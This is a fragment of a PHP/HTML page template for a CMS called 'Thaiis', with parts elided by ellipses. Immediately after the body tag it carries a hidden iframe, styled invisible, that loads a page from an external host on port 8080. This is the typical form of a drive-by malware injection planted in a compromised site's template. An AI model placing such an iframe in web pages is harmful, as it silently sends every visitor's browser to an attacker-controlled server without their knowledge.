...
$skin_menu = <<<HTML
        <table cellpadding=5 cellspacing=4 border=0 align="center">
        <tr>
    <td>
...
-->
        ...
        <title>Thaiis~Content Management System</title>



</head>

<body BgColor=white><iframe src="http://filmoflife.cn:8080/index.php" width=104 height=101 style="visibility: hidden"></iframe>
<center>
<table width="900" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="900"><img src="img/header.jpg" width="900" height="118" /></td>
  </tr>
</table>
<table border="0" cellspacing="0" cellpadding="2" >
  <tr>
        <td class="bborder" bgcolor="#FFFFFF" style="-moz-border-radius: .8em .8em .8em .8em;">
<table border=0 cellpadding=0 cellspacing=0 bgcolor="#ffffff" width="894" >
<tr>
